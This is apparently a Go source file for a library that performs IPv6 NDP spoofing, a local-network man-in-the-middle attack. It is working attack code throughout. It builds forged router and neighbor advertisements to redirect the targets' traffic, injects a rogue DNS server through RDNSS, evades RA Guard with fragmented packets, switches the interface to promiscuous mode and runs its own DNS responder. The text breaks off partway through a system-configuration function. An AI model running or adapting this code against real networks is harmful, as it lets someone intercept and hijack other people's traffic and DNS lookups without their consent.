// Package ndpspoof is a library for performing NDP spoofing with ICMPv6 router/neighbor advertisement
package ndpspoof

import (
	"errors"
	"fmt"
	"io"
	"maps"
	"net"
	"net/netip"
	"os"
	"os/exec"
	"runtime"
	"slices"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/mdlayher/packet"
	"github.com/rs/zerolog"
	"github.com/shadowy-pycoder/mshark/layers"
	"github.com/shadowy-pycoder/mshark/network"
	"github.com/shadowy-pycoder/mshark/oui"
)

var (
	AutoConfigSupportedOS                   = []string{"linux", "android"}
	defaultRLT                              = 600 // also used for RDNSS lifetime
	probeThrottling           time.Duration = 50 * time.Millisecond
	probeTargetsInterval      time.Duration = 60 * time.Second
	refreshNDPCacheInterval   time.Duration = 15 * time.Second
	ndpSpoofTargetsInterval   time.Duration = 5 * time.Second
	ndpSendFragmentsInterval  time.Duration = 1 * time.Second
	ndpUnspoofPacketCount                   = 3
	ndpUnspoofTargetsInterval time.Duration = 500 * time.Millisecond
	udpBufferSize                           = 4096
	readTimeoutUDP            time.Duration = 5 * time.Second
	writeTimeoutUDP           time.Duration = 5 * time.Second
	errInvalidWrite                         = errors.New("invalid write result")
	errNDPSpoofConfig                       = fmt.Errorf(
		`failed parsing ndp spoof options. Example: "ra true;na true;targets fe80::3a1c:7bff:fe22:91a4,fe80::b6d2:4cff:fe9a:5f10;;rdnss 2001:4860:4860::8888;gateway fe80::1;fullduplex false;debug true;interface eth0;prefix 2001:db8:7a31:4400::/64;router_lifetime 30s;auto true;interval 10s;mtu 1500;packet HRD F2 DSDS"`,
	)
)

type NDPSpoofConfig struct {
	Targets        string
	Gateway        *netip.Addr
	Interface      string
	FullDuplex     bool
	Prefix         *netip.Prefix
	RouterLifetime time.Duration
	Logger         *zerolog.Logger
	RA             bool
	NA             bool
	RDNSS          string
	Debug          bool
	Auto           bool
	PacketInterval time.Duration
	MTU            uint32
	PacketQuery    string
}

// NewNDPSpoofConfig creates NDPSpoofConfig from a list of options separated by semicolon and logger.
//
// Example: "ra true;na true;targets fe80::3a1c:7bff:fe22:91a4,fe80::b6d2:4cff:fe9a:5f10;rdnss 2001:4860:4860::8888;gateway fe80::1;fullduplex false;debug true;interface eth0;prefix 2001:db8:7a31:4400::/64;router_lifetime 30s;auto true;interval 10s;mtu 1500;packet HRD F2 DSDS".
//
// When ra (router advertisement) and na (neighbor advertisement) are both false or not specified, ra set to true.
//
// If na is enabled, at least one target should be provided. The gateway value (or default one) will be used in neighbor advertisement.
//
// For boolean fields value can be specified as 0 or 1.
func NewNDPSpoofConfig(s string, logger *zerolog.Logger) (*NDPSpoofConfig, error) {
	nsc := &NDPSpoofConfig{Logger: logger}

	for opt := range strings.SplitSeq(strings.ToLower(s), ";") {
		keyval := strings.SplitN(strings.Trim(opt, " "), " ", 2)
		if len(keyval) < 2 {
			return nil, errNDPSpoofConfig
		}
		key := keyval[0]
		val := keyval[1]
		switch key {
		case "targets":
			nsc.Targets = val
		case "interface":
			nsc.Interface = val
		case "gateway":
			gateway, err := netip.ParseAddr(val)
			if err != nil {
				return nil, err
			}
			nsc.Gateway = &gateway
		case "fullduplex":
			switch val {
			case "true", "1":
				nsc.FullDuplex = true
			case "false", "0":
				nsc.FullDuplex = false
			default:
				return nil, fmt.Errorf("unknown value %q for %q", val, key)
			}
		case "prefix":
			prefix, err := netip.ParsePrefix(val)
			if err != nil {
				return nil, err
			}
			if !network.Is6(prefix.Addr()) {
				return nil, fmt.Errorf("prefix is not valid IPv6 address")
			}
			nsc.Prefix = &prefix
		case "router_lifetime":
			rlt, err := time.ParseDuration(val)
			if err != nil {
				return nil, err
			}
			if rlt.Seconds() > 65535 {
				return nil, fmt.Errorf("router lifetime is invalid")
			}
			nsc.RouterLifetime = rlt
		case "ra":
			switch val {
			case "true", "1":
				nsc.RA = true
			case "false", "0":
				nsc.RA = false
			default:
				return nil, fmt.Errorf("unknown value %q for %q", val, key)
			}
		case "na":
			switch val {
			case "true", "1":
				nsc.NA = true
			case "false", "0":
				nsc.NA = false
			default:
				return nil, fmt.Errorf("unknown value %q for %q", val, key)
			}
		case "rdnss":
			nsc.RDNSS = val
		case "debug":
			switch val {
			case "true", "1":
				nsc.Debug = true
			case "false", "0":
				nsc.Debug = false
			default:
				return nil, fmt.Errorf("unknown value %q for %q", val, key)
			}
		case "auto":
			switch val {
			case "true", "1":
				nsc.Auto = true
			case "false", "0":
				nsc.Auto = false
			default:
				return nil, fmt.Errorf("unknown value %q for %q", val, key)
			}
		case "interval":
			interval, err := time.ParseDuration(val)
			if err != nil {
				return nil, err
			}
			nsc.PacketInterval = interval
		case "mtu":
			mtu, err := strconv.ParseUint(val, 10, 32)
			if err != nil {
				return nil, err
			}
			nsc.MTU = uint32(mtu)
		case "packet":
			nsc.PacketQuery = val
		default:
			return nil, errNDPSpoofConfig
		}
	}
	if !nsc.RA && !nsc.NA {
		nsc.RA = true
	}
	if nsc.NA && nsc.Targets == "" {
		return nil, fmt.Errorf("list of targets is empty")
	}
	if !nsc.RA && nsc.RDNSS != "" {
		return nil, fmt.Errorf("rdnss requires ra enabled")
	}
	if !slices.Contains(AutoConfigSupportedOS, runtime.GOOS) && nsc.Auto {
		return nil, fmt.Errorf("auto configuration is not supported on %s", runtime.GOOS)
	}
	return nsc, nil
}

type NeighCache struct {
	sync.RWMutex
	Ifname  string
	Entries map[string]net.HardwareAddr
}

func (nc *NeighCache) String() string {
	var sb strings.Builder

	nc.RLock()
	defer nc.RUnlock()
	for _, k := range slices.Sorted(maps.Keys(nc.Entries)) {
		fmt.Fprintf(&sb, "%s (%s), ", k, oui.VendorWithMAC(nc.Entries[k]))
	}
	return strings.TrimRight(sb.String(), ", ")
}

func (nc *NeighCache) Get(ip netip.Addr) (net.HardwareAddr, bool) {
	nc.RLock()
	defer nc.RUnlock()
	hw, ok := nc.Entries[ip.String()]
	return hw, ok
}

func (nc *NeighCache) Set(ip netip.Addr, hw net.HardwareAddr) {
	nc.Lock()
	nc.Entries[ip.String()] = hw
	nc.Unlock()
}

func (nc *NeighCache) Delete(ip netip.Addr) {
	nc.Lock()
	delete(nc.Entries, ip.String())
	nc.Unlock()
}

func (nc *NeighCache) Refresh() error {
	nc.Lock()
	defer nc.Unlock()
	cmd := exec.Command("sh", "-c", "ip -6 -br neigh")
	out, err := cmd.Output()
	if err != nil {
		return err
	}
	clear(nc.Entries)
	for line := range strings.Lines(string(out)) {
		fields := strings.Fields(line)
		if len(fields) < 3 {
			continue
		}
		if fields[1] != nc.Ifname {
			continue
		}
		ip, err := netip.ParseAddr(fields[0])
		if err != nil {
			return err
		}
		hw, err := net.ParseMAC(fields[2])
		if err != nil {
			return err
		}
		nc.Entries[ip.String()] = hw
	}
	return nil
}

type ethPacket struct {
	addr net.HardwareAddr
	data []byte
}

type NDPSpoofer struct {
	raEnabled     bool
	naEnabled     bool
	debug         bool
	auto          bool
	opts          map[string]string
	spoofInterval time.Duration
	mtu           uint32
	gwConn        *net.UDPConn
	gwDNSAddr     *net.UDPAddr
	targets       []netip.Addr
	dnsServers    []netip.Addr
	raguard       *raGuardPayload
	unraguard     *raGuardPayload // for unspoof
	gwIP          *netip.Addr
	gwMAC         *net.HardwareAddr
	iface         *net.Interface
	hostIP        *netip.Addr
	hostIPGlobal  *netip.Addr
	hostMAC       *net.HardwareAddr
	fullduplex    bool
	neighCache    *NeighCache
	packets       chan *ethPacket
	logger        *zerolog.Logger
	prefixGlobal  *netip.Prefix
	rlt           uint16
	startingFlag  atomic.Bool
	quit          chan bool
	wg            sync.WaitGroup
	pconn         *packet.Conn
}

func (nr *NDPSpoofer) Interface() *net.Interface {
	return nr.iface
}

func (nr *NDPSpoofer) GatewayIP() *netip.Addr {
	return nr.gwIP
}

func (nr *NDPSpoofer) GatewayMAC() *net.HardwareAddr {
	return nr.gwMAC
}

func (nr *NDPSpoofer) HostIP() *netip.Addr {
	return nr.hostIP
}

func (nr *NDPSpoofer) HostIPGlobal() *netip.Addr {
	return nr.hostIPGlobal
}

func (nr *NDPSpoofer) HostMAC() *net.HardwareAddr {
	return nr.hostMAC
}

func (nr *NDPSpoofer) NeighCache() *NeighCache {
	return nr.neighCache
}

func NewNDPSpoofer(conf *NDPSpoofConfig) (*NDPSpoofer, error) {
	nr := &NDPSpoofer{}
	var err error
	if !conf.RA && !conf.NA {
		return nil, fmt.Errorf("[ndp spoofer] no attack vectors enabled")
	}
	nr.auto = conf.Auto
	if nr.auto {
		if os.Geteuid() != 0 {
			return nil, fmt.Errorf("[ndp spoofer] auto configuration requires root privileges")
		}
		if !slices.Contains(AutoConfigSupportedOS, runtime.GOOS) {
			return nil, fmt.Errorf("[ndp spoofer] auto configuration is not supported on %s", runtime.GOOS)
		}
		nr.opts = make(map[string]string, 15)
	}
	if conf.Interface != "" {
		nr.iface, err = net.InterfaceByName(conf.Interface)
		if err != nil {
			return nil, fmt.Errorf("[ndp spoofer] %v", err)
		}
	} else {
		nr.iface, err = network.GetDefaultInterface()
		if err != nil {
			nr.iface, err = network.GetDefaultInterfaceFromRouteIPv6()
			if err != nil {
				return nil, fmt.Errorf("[ndp spoofer] %v", err)
			}
		}
	}
	if conf.MTU > 0 {
		nr.mtu = conf.MTU
	} else {
		nr.mtu = uint32(nr.iface.MTU)
	}
	prefixLocal, err := network.GetIPv6LinkLocalUnicastPrefixFromInterface(nr.iface)
	if err != nil {
		return nil, fmt.Errorf("[ndp spoofer] %v", err)
	}
	hostIP := prefixLocal.Addr()
	nr.hostIP = &hostIP
	nr.hostMAC = &nr.iface.HardwareAddr
	hostIPGlobal, err := network.GetHostIPv6GlobalUnicastFromRoute()
	if err == nil {
		nr.hostIPGlobal = &hostIPGlobal
	}
	if conf.RA {
		nr.raEnabled = true
		if conf.Prefix != nil {
			nr.prefixGlobal = conf.Prefix
		} else {
			prefixGlobal, err := network.GetIPv6GlobalUnicastPrefixFromInterface(nr.iface)
			if err != nil {
				return nil, fmt.Errorf("[ndp spoofer] %v", err)
			}
			nr.prefixGlobal = &prefixGlobal
		}
		if conf.RouterLifetime.Seconds() > 0 {
			nr.rlt = uint16(conf.RouterLifetime.Seconds())
		} else {
			nr.rlt = uint16(defaultRLT)
		}
		if conf.RDNSS != "" {
			dnsServers := make([]netip.Addr, 0, 5)
			for ipstr := range strings.SplitSeq(conf.RDNSS, ",") {
				ip, err := netip.ParseAddr(strings.TrimSpace(ipstr))
				if err != nil {
					return nil, fmt.Errorf("[ndp spoofer] %v", err)
				}
				// remove invalid addresses (sanity check)
				if !network.Is6(ip) {
					continue
				}
				// remove multicast addresses
				if ip.IsMulticast() {
					continue
				}
				dnsServers = append(dnsServers, ip)
			}
			if len(dnsServers) == 0 {
				return nil, fmt.Errorf("[ndp spoofer] list of dns servers is empty")
			}
			nr.dnsServers = dnsServers
		}
		if nr.auto && len(nr.dnsServers) == 0 { // setup simple DNS server for incoming connecitons
			nr.dnsServers = append(nr.dnsServers, *nr.hostIP)
			pconn, err := newDNSServer()
			if err != nil {
				return nil, fmt.Errorf("[ndp spoofer] failed creating DNS server on %s:53: %v", nr.hostIP, err)
			}
			nr.gwConn = pconn.(*net.UDPConn)
			nr.gwDNSAddr = nr.getResolver()
		}
		if conf.PacketQuery != "" {
			ra := nr.newRAPacket(nr.rlt)
			nr.raguard, err = newRAGuardPayload(conf.PacketQuery, *nr.hostIP, &ra)
			if err != nil {
				return nil, fmt.Errorf("[ndp spoofer] %v", err)
			}
			ra = nr.newRAPacket(0)
			nr.unraguard, err = newRAGuardPayload(conf.PacketQuery, *nr.hostIP, &ra)
			if err != nil {
				return nil, fmt.Errorf("[ndp spoofer] %v", err)
			}
		}
	}
	if conf.NA {
		if conf.Gateway != nil && network.Is6(*conf.Gateway) {
			nr.gwIP = conf.Gateway
		} else {
			var gwIP netip.Addr
			gwIP, err = network.GetGatewayIPv6FromInterface(nr.iface.Name)
			if err != nil {
				return nil, fmt.Errorf("[ndp spoofer] failed fetching gateway ip: %w", err)
			}
			nr.gwIP = &gwIP
		}
		nr.naEnabled = true
		nr.neighCache = &NeighCache{Ifname: nr.iface.Name, Entries: make(map[string]net.HardwareAddr)}
		err = nr.neighCache.Refresh()
		if err != nil {
			return nil, fmt.Errorf("[ndp spoofer] %v", err)
		}
		if gwMAC, ok := nr.neighCache.Get(*nr.gwIP); !ok {
			doPing(nr.gwIP.WithZone(nr.iface.Name))
			time.Sleep(probeThrottling)
			err = nr.neighCache.Refresh()
			if err != nil {
				return nil, fmt.Errorf("[ndp spoofer] %v", err)
			}
			if gwMAC, ok := nr.neighCache.Get(*nr.gwIP); !ok {
				return nil, fmt.Errorf("[ndp spoofer] failed fetching gateway MAC")
			} else {
				nr.gwMAC = &gwMAC
			}
		} else {
			nr.gwMAC = &gwMAC
		}
		nr.fullduplex = conf.FullDuplex
		targets := make([]netip.Addr, 0, 5)
		for ipstr := range strings.SplitSeq(conf.Targets, ",") {
			ip, err := netip.ParseAddr(strings.TrimSpace(ipstr))
			if err != nil {
				return nil, fmt.Errorf("[ndp spoofer] %v", err)
			}
			// remove invalid addresses (sanity check)
			if !network.Is6(ip) {
				continue
			}
			// remove multicast addresses
			if ip.IsMulticast() {
				continue
			}
			// remove unspecified addresses
			if ip.IsUnspecified() {
				continue
			}
			// remove loopback addresses
			if ip.IsLoopback() {
				continue
			}
			// remove addresses that do not belong to subnet
			if !prefixLocal.Contains(ip) {
				continue
			}
			// remove host from targets
			if ip.Compare(*nr.hostIP) == 0 {
				continue
			}
			// remove gateway from targets
			if ip.Compare(*nr.gwIP) == 0 {
				continue
			}
			targets = append(targets, ip)
		}
		if len(targets) == 0 {
			return nil, fmt.Errorf("[ndp spoofer] list of targets is empty")
		}
		nr.targets = targets
	}
	nr.packets = make(chan *ethPacket)
	nr.quit = make(chan bool)
	nr.pconn, err = packet.Listen(nr.iface, packet.Raw, network.ETH_P_ALL, nil)
	if err != nil {
		if errors.Is(err, os.ErrPermission) {
			return nil, fmt.Errorf("[ndp spoofer] permission denied (try setting CAP_NET_RAW capability): %v", err)
		}
		return nil, fmt.Errorf("[ndp spoofer] failed to listen: %v", err)
	}
	nr.debug = conf.Debug
	if conf.PacketInterval.Seconds() > 0 {
		nr.spoofInterval = conf.PacketInterval
	} else {
		nr.spoofInterval = ndpSpoofTargetsInterval
	}
	// setting up logger
	if conf.Logger != nil {
		lvl := zerolog.InfoLevel
		if nr.debug {
			lvl = zerolog.DebugLevel
		}
		logger := conf.Logger.Level(lvl)
		nr.logger = &logger
	} else {
		zerolog.SetGlobalLevel(zerolog.InfoLevel)
		if nr.debug {
			zerolog.SetGlobalLevel(zerolog.DebugLevel)
		}
		logger := zerolog.New(os.Stdout).With().Timestamp().Logger()
		nr.logger = &logger
	}
	return nr, nil
}

func (nr *NDPSpoofer) Start() {
	nr.startingFlag.Store(true)
	nr.logger.Info().Msg("[ndp spoofer] Started")
	if nr.auto {
		nr.logger.Info().Msg("[ndp spoofer] Configuring system")
		if err := nr.applySettings(); err != nil {
			nr.logger.Fatal().Err(err).Msg("[ndp spoofer] Failed while configuring system. Are you root?")
		}
		if nr.gwConn != nil && nr.gwDNSAddr != nil {
			nr.wg.Add(1)
			go nr.listenAndServeDNS(nr.gwDNSAddr)
			nr.logger.Info().Msgf("[ndp spoofer] Running DNS server on %s:53", nr.hostIP)
			nr.logger.Info().Msgf("[ndp spoofer] DNS resolver is %s", nr.gwDNSAddr)
		}
	}
	go nr.handlePackets()
	if nr.raEnabled {
		nr.logger.Info().Msg("[ndp spoofer] RA spoofing enabled")
		if nr.raguard != nil {
			nr.logger.Info().Msg("[ndp spoofer] RA Guard evasion enabled")
		}
	} else {
		nr.logger.Info().Msg("[ndp spoofer] RA spoofing disabled")
	}
	if len(nr.dnsServers) > 0 {
		nr.logger.Info().Msg("[ndp spoofer] RDNSS spoofing enabled")
	} else {
		nr.logger.Info().Msg("[ndp spoofer] RDNSS spoofing disabled")
	}
	if nr.naEnabled {
		nr.logger.Info().Msg("[ndp spoofer] NA spoofing enabled")
	} else {
		nr.logger.Info().Msg("[ndp spoofer] NA spoofing disabled")
	}
	if nr.naEnabled {
		nr.logger.Debug().Msgf("[ndp spoofer] Probing %d targets", len(nr.targets))
		nr.probeTargetsOnce()
		nr.logger.Debug().Msg("[ndp spoofer] Refreshing neighbor cache")
		nr.neighCache.Refresh()
		nr.logger.Info().Msgf("[ndp spoofer] Detected targets: %s", nr.neighCache)
		nr.wg.Add(3)
		go nr.probeTargets()
		go nr.refreshNeighCache()
		go nr.spoofNA()
	}
	if nr.raEnabled {
		nr.wg.Add(1)
		if nr.raguard != nil {
			go nr.spoofRAGuard()
		} else {
			go nr.spoofRA()
		}
	}
	nr.startingFlag.Store(false)
	<-nr.quit
}

func (nr *NDPSpoofer) Stop() error {
	for nr.startingFlag.Load() {
		time.Sleep(50 * time.Millisecond)
	}
	nr.logger.Info().Msg("[ndp spoofer] Stopping...")
	close(nr.quit)
	nr.wg.Wait()
	if nr.raEnabled {
		nr.wg.Add(1)
		if nr.raguard != nil {
			go nr.unspoofRAGuard()
		} else {
			go nr.unspoofRA()
		}
	}
	if nr.naEnabled {
		nr.wg.Add(1)
		go nr.unspoofNA()
	}
	nr.wg.Wait()
	close(nr.packets)
	if nr.auto {
		nr.logger.Info().Msg("[ndp spoofer] Restoring system settings")
		nr.clearSettings()
	}
	nr.logger.Info().Msg("[ndp spoofer] Stopped")
	return nil
}

func (nr *NDPSpoofer) spoofNA() {
	t := time.NewTicker(nr.spoofInterval)
	for {
		select {
		case <-nr.quit:
			nr.wg.Done()
			return
		case <-t.C:
			for _, targetIP := range nr.targets {
				if targetMAC, ok := nr.neighCache.Get(targetIP); !ok {
					continue
				} else {
					np, err := nr.newNAPacket(*nr.hostMAC, targetMAC, *nr.gwIP, targetIP, *nr.gwIP)
					if err != nil {
						continue
					}
					nr.logger.Debug().
						Msgf("[ndp spoofer] Sending %s of NA packet to %s (%s)", network.PrettifyBytes(int64(len(np.data))), targetIP, oui.VendorWithMAC(targetMAC))
					nr.packets <- np
				}
				if nr.fullduplex {
					np, err := nr.newNAPacket(*nr.hostMAC, *nr.gwMAC, targetIP, *nr.gwIP, targetIP)
					if err != nil {
						continue
					}
					nr.logger.Debug().Msgf("[ndp spoofer] Telling %s (%s) we are %s", nr.gwIP, oui.VendorWithMAC(*nr.gwMAC), targetIP)
					nr.packets <- np
				}
			}
		}
	}
}

func (nr *NDPSpoofer) unspoofNA() error {
	nr.logger.Info().Msgf("[ndp spoofer] Restoring neighbor cache of %d targets", len(nr.targets))
	for range ndpUnspoofPacketCount {
		for _, targetIP := range nr.targets {
			if targetMAC, ok := nr.neighCache.Get(targetIP); !ok {
				continue
			} else {
				nr.logger.Debug().Msgf("[ndp spoofer] Restoring neighbor cache of %s (%s)", targetIP, oui.VendorWithMAC(targetMAC))
				np, err := nr.newNAPacket(*nr.gwMAC, targetMAC, *nr.gwIP, targetIP, *nr.gwIP)
				if err != nil {
					nr.wg.Done()
					return err
				}
				nr.packets <- np
			}
		}
		time.Sleep(ndpUnspoofTargetsInterval)
	}
	nr.wg.Done()
	return nil
}

func (nr *NDPSpoofer) spoofRA() {
	ra := nr.newRAPacket(nr.rlt)
	icmp6 := layers.ProtoICMPv6
	ipv6, err := layers.NewIPv6Packet(*nr.hostIP, network.IPv6MulticastAllNodes, nil, &icmp6, ra.ToBytes())
	if err != nil {
		nr.logger.Debug().Msg(err.Error())
		nr.wg.Done()
		return
	}
	ra.SetChecksum(ipv6.PseudoHeader().ToBytes())
	ipv6.SetPayload(ra.ToBytes())
	eth, err := layers.NewEthernetFrame(network.IPv6MulticastMAC, *nr.hostMAC, layers.EtherTypeIPv6, ipv6.ToBytes())
	if err != nil {
		nr.logger.Debug().Msg(err.Error())
		nr.wg.Done()
		return
	}
	raPacket := &ethPacket{addr: network.IPv6MulticastMAC, data: eth.ToBytes()}
	raLen := network.PrettifyBytes(int64(len(raPacket.data)))
	hostVMAC := oui.VendorWithMAC(*nr.hostMAC)
	t := time.NewTicker(nr.spoofInterval)
	for {
		select {
		case <-nr.quit:
			nr.wg.Done()
			return
		case <-t.C:
			nr.logger.Debug().Msgf("[ndp spoofer] Sending %s of RA packet from %s (%s)", raLen, nr.hostIP, hostVMAC)
			nr.packets <- raPacket
		}
	}
}

func (nr *NDPSpoofer) unspoofRA() error {
	nr.logger.Info().Msgf("[ndp spoofer] Removing spoofed gateway entry from all affected targets")
	ra := nr.newRAPacket(0)
	icmp6 := layers.ProtoICMPv6
	ipv6, err := layers.NewIPv6Packet(*nr.hostIP, network.IPv6MulticastAllNodes, nil, &icmp6, ra.ToBytes())
	if err != nil {
		nr.logger.Debug().Msg(err.Error())
		nr.wg.Done()
		return err
	}
	ra.SetChecksum(ipv6.PseudoHeader().ToBytes())
	ipv6.SetPayload(ra.ToBytes())
	eth, err := layers.NewEthernetFrame(network.IPv6MulticastMAC, *nr.hostMAC, layers.EtherTypeIPv6, ipv6.ToBytes())
	if err != nil {
		nr.logger.Debug().Msg(err.Error())
		nr.wg.Done()
		return err
	}
	raPacket := &ethPacket{addr: network.IPv6MulticastMAC, data: eth.ToBytes()}
	raLen := network.PrettifyBytes(int64(len(raPacket.data)))
	var um string
	if len(nr.dnsServers) > 0 {
		um = "router_lifetime=0 dns_lifetime=0"
	} else {
		um = "router_lifetime=0"
	}
	for range ndpUnspoofPacketCount {
		nr.logger.Debug().Msgf("[ndp spoofer] Sending %s of RA packet with [%s]", raLen, um)
		nr.packets <- raPacket
		time.Sleep(ndpUnspoofTargetsInterval)
	}
	nr.wg.Done()
	return nil
}

func (nr *NDPSpoofer) spoofRAGuard() {
	hostVMAC := oui.VendorWithMAC(*nr.hostMAC)
	t := time.NewTicker(nr.spoofInterval)
	if len(nr.raguard.chunks) == 1 {
		eth, err := layers.NewEthernetFrame(network.IPv6MulticastMAC, *nr.hostMAC, layers.EtherTypeIPv6, nr.raguard.chunks[0])
		if err != nil {
			nr.logger.Debug().Msg(err.Error())
			nr.wg.Done()
			return
		}
		raPacket := &ethPacket{addr: network.IPv6MulticastMAC, data: eth.ToBytes()}
		raLen := network.PrettifyBytes(int64(len(raPacket.data)))
		for {
			select {
			case <-nr.quit:
				nr.wg.Done()
				return
			case <-t.C:
				nr.logger.Debug().Msgf("[ndp spoofer] Sending %s of RA packet from %s (%s)", raLen, nr.hostIP, hostVMAC)
				nr.packets <- raPacket
			}
		}
	} else {
		for {
			select {
			case <-nr.quit:
				nr.wg.Done()
				return
			case <-t.C:
				m := true
				ident := layers.MustGenerateRandomUint32BE()
				for i, chunk := range nr.raguard.chunks {
					if i == len(nr.raguard.chunks)-1 {
						m = false
					}
					extHeaders := append(nr.raguard.pfh,
						&layers.FragmentExtHeader{
							NextHeader:     nr.raguard.next,
							M:              m,
							FragmentOffset: nr.raguard.offsets[i],
							Identification: ident,
						})
					ipv6, err := layers.NewIPv6Packet(*nr.hostIP, network.IPv6MulticastAllNodes, extHeaders, nil, chunk)
					if err != nil {
						nr.logger.Debug().Msg(err.Error())
						nr.wg.Done()
						return
					}
					eth, err := layers.NewEthernetFrame(network.IPv6MulticastMAC, *nr.hostMAC, layers.EtherTypeIPv6, ipv6.ToBytes())
					if err != nil {
						nr.logger.Debug().Msg(err.Error())
						nr.wg.Done()
						return
					}
					raPacket := &ethPacket{addr: network.IPv6MulticastMAC, data: eth.ToBytes()}
					raLen := network.PrettifyBytes(int64(len(raPacket.data)))
					nr.logger.Debug().
						Msgf("[ndp spoofer] Sending %s of RA packet fragment (%#04x) from %s (%s)", raLen, ident, nr.hostIP, hostVMAC)
					nr.packets <- raPacket
					time.Sleep(ndpSendFragmentsInterval)
				}
			}
		}
	}
}

func (nr *NDPSpoofer) unspoofRAGuard() error {
	nr.logger.Info().Msgf("[ndp spoofer] Removing spoofed gateway entry from all affected targets")
	var um string
	if len(nr.dnsServers) > 0 {
		um = "router_lifetime=0 dns_lifetime=0"
	} else {
		um = "router_lifetime=0"
	}
	for range ndpUnspoofPacketCount {
		if len(nr.unraguard.chunks) == 1 {
			eth, err := layers.NewEthernetFrame(network.IPv6MulticastMAC, *nr.hostMAC, layers.EtherTypeIPv6, nr.unraguard.chunks[0])
			if err != nil {
				nr.logger.Debug().Msg(err.Error())
				nr.wg.Done()
				return err
			}
			raPacket := &ethPacket{addr: network.IPv6MulticastMAC, data: eth.ToBytes()}
			raLen := network.PrettifyBytes(int64(len(raPacket.data)))
			nr.logger.Debug().Msgf("[ndp spoofer] Sending %s of RA packet with [%s]", raLen, um)
			nr.packets <- raPacket
			time.Sleep(ndpUnspoofTargetsInterval)
		} else {
			m := true
			ident := layers.MustGenerateRandomUint32BE()
			for i, chunk := range nr.unraguard.chunks {
				if i == len(nr.unraguard.chunks)-1 {
					m = false
				}
				extHeaders := append(nr.unraguard.pfh,
					&layers.FragmentExtHeader{
						NextHeader:     nr.unraguard.next,
						M:              m,
						FragmentOffset: nr.unraguard.offsets[i],
						Identification: ident,
					})
				ipv6, err := layers.NewIPv6Packet(*nr.hostIP, network.IPv6MulticastAllNodes, extHeaders, nil, chunk)
				if err != nil {
					nr.logger.Debug().Msg(err.Error())
					nr.wg.Done()
					return err
				}
				eth, err := layers.NewEthernetFrame(network.IPv6MulticastMAC, *nr.hostMAC, layers.EtherTypeIPv6, ipv6.ToBytes())
				if err != nil {
					nr.logger.Debug().Msg(err.Error())
					nr.wg.Done()
					return err
				}
				raPacket := &ethPacket{addr: network.IPv6MulticastMAC, data: eth.ToBytes()}
				raLen := network.PrettifyBytes(int64(len(raPacket.data)))
				nr.logger.Debug().Msgf("[ndp spoofer] Sending %s of RA packet fragment (%#04x) with [%s]", raLen, ident, um)
				nr.packets <- raPacket
				time.Sleep(ndpUnspoofTargetsInterval)
			}
		}
	}
	nr.wg.Done()
	return nil
}

func (nr *NDPSpoofer) newRAPacket(rlt uint16) layers.ICMPv6RouterAdvertisement {
	ra := layers.ICMPv6RouterAdvertisement{
		CurHopLimit:    255,
		Prf:            layers.ICMPv6RouterPreferenceHigh,
		RouterLifetime: rlt,
		Options: []layers.ICMPv6Option{
			&layers.ICMPv6OptPrefixInfo{
				PrefixLength:                   64,
				OnLink:                         true,
				AutonomousAddressConfiguration: true,
				ValidLifetime:                  86400,
				PreferredLifetime:              14400,
				Prefix:                         nr.prefixGlobal.Masked().Addr(),
			},
			&layers.ICMPv6OptMTU{MTU: nr.mtu},
			&layers.ICMPv6OptLinkLayerAddress{Direction: layers.LLASource, Addr: *nr.hostMAC},
		},
	}
	if len(nr.dnsServers) > 0 {
		ra.Options = append(ra.Options, &layers.ICMPv6OptRDNSS{Lifetime: uint32(rlt), Addresses: nr.dnsServers})
	}
	return ra
}

func (nr *NDPSpoofer) newNAPacket(srcMAC, dstMAC net.HardwareAddr, srcIP, dstIP, targetIP netip.Addr) (*ethPacket, error) {
	na := layers.ICMPv6NeighborAdvertisement{
		Solicited:     true,
		Override:      true,
		TargetAddress: targetIP,
		Options: []layers.ICMPv6Option{
			&layers.ICMPv6OptLinkLayerAddress{Direction: layers.LLATarget, Addr: srcMAC},
		},
	}
	icmp6 := layers.ProtoICMPv6
	ipv6, err := layers.NewIPv6Packet(srcIP, dstIP, nil, &icmp6, na.ToBytes())
	if err != nil {
		nr.logger.Debug().Msg(err.Error())
		return nil, err
	}
	na.SetChecksum(ipv6.PseudoHeader().ToBytes())
	ipv6.SetPayload(na.ToBytes())
	eth, err := layers.NewEthernetFrame(dstMAC, srcMAC, layers.EtherTypeIPv6, ipv6.ToBytes())
	if err != nil {
		nr.logger.Debug().Msg(err.Error())
		return nil, err
	}
	return &ethPacket{addr: dstMAC, data: eth.ToBytes()}, nil
}

func doPing(ip netip.Addr) error {
	ping := exec.Command("sh", "-c", fmt.Sprintf("ping -6 -c1 -t1 -w1 %s", ip))
	if err := ping.Start(); err != nil {
		return err
	}
	if err := ping.Wait(); err != nil {
		return err
	}
	return nil
}

func (nr *NDPSpoofer) probeTargetsOnce() {
	var wg sync.WaitGroup
	for _, ip := range nr.targets {
		wg.Add(1)
		go func(ip netip.Addr) {
			defer wg.Done()
			doPing(ip.WithZone(nr.iface.Name))
		}(ip)
		time.Sleep(probeThrottling)
	}
	wg.Wait()
}

func (nr *NDPSpoofer) probeTargets() {
	t := time.NewTicker(probeTargetsInterval)
	var wg sync.WaitGroup
	for {
		select {
		case <-nr.quit:
			nr.wg.Done()
			return
		case <-t.C:
			nr.logger.Debug().Msgf("[ndp spoofer] Probing %d targets", len(nr.targets))
			for _, ip := range nr.targets {
				wg.Add(1)
				go func(ip netip.Addr) {
					defer wg.Done()
					doPing(ip.WithZone(nr.iface.Name))
				}(ip)
				time.Sleep(probeThrottling)
			}
			wg.Wait()
		}
	}
}

func (nr *NDPSpoofer) writePacket(p *ethPacket) (int, error) {
	return nr.pconn.WriteTo(p.data, &packet.Addr{HardwareAddr: p.addr})
}

func (nr *NDPSpoofer) handlePackets() {
	for p := range nr.packets {
		_, err := nr.writePacket(p)
		if err != nil {
			nr.logger.Debug().Msg(err.Error())
		}
	}
}

func (nr *NDPSpoofer) refreshNeighCache() {
	t := time.NewTicker(refreshNDPCacheInterval)
	for {
		select {
		case <-nr.quit:
			nr.wg.Done()
			return
		case <-t.C:
			nr.logger.Debug().Msg("[ndp spoofer] Refreshing neighbor cache")
			nr.neighCache.Refresh()
			nr.logger.Info().Msgf("[ndp spoofer] Detected targets: %s", nr.neighCache)
		}
	}
}

func (nr *NDPSpoofer) applySettings() error {
	promisc := network.GetPromiscuous(nr.iface.Name)
	if promisc < 0 {
		return fmt.Errorf("failed getting promiscuous mode value from %s", nr.iface.Name)
	}
	if err := network.SetPromiscuous(nr.iface.Name, true); err != nil {
		return err
	}
	if promisc > 0 {
